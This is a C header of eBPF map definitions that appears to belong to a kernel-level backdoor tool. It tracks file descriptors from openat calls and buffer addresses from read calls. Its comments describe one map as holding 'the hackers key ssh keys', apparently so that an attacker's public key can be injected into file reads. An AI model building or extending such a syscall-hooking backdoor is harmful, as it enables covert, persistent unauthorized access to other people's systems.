#include "./common.h"
#ifndef __MAPS__
#define __MAPS__

// Ringbuffer Map to pass messages from kernel to user
// No Event Struct no Ringbuffer.
/*
struct
{
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");
*/

// Map to hold the File Descriptors from 'openat' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);         // key is pid_tgid
    __type(value, unsigned int); // value are always zero.
} map_fds SEC(".maps");

// struct to store the buffer mem id and buffer
struct syscall_read_logging 
{
    long unsigned int buffer_addr; // char buffer pointer addr
    long int calling_size; // read(size) store the size.
};

// Map to fold the buffer sized from 'read' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);              // key is pid_tgid
    // __type(value, long unsigned int); // char buffer pointer location
    __type(value, struct syscall_read_logging); 
} map_buff_addrs SEC(".maps");

// Report Events
/*
struct event
{
    int pid;
    char comm[TASK_COMM_LEN];
    bool success;
};
// const struct event *unused UNUSED;
__EXPORTED_DEFINE(event, unused1);
*/

// struct defined custom_payload to get usermode ssh key string
struct custom_payload
{
    u8 raw_buf[max_payload_len];
    u32 payload_len;
};
__EXPORTED_DEFINE(custom_payload, unused2);
// Map to hold the hackers key ssh keys.
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u8);                    // key is id
    __type(value, struct custom_payload ); // value is ssh pub key
} map_payload_buffer SEC(".maps");

#endif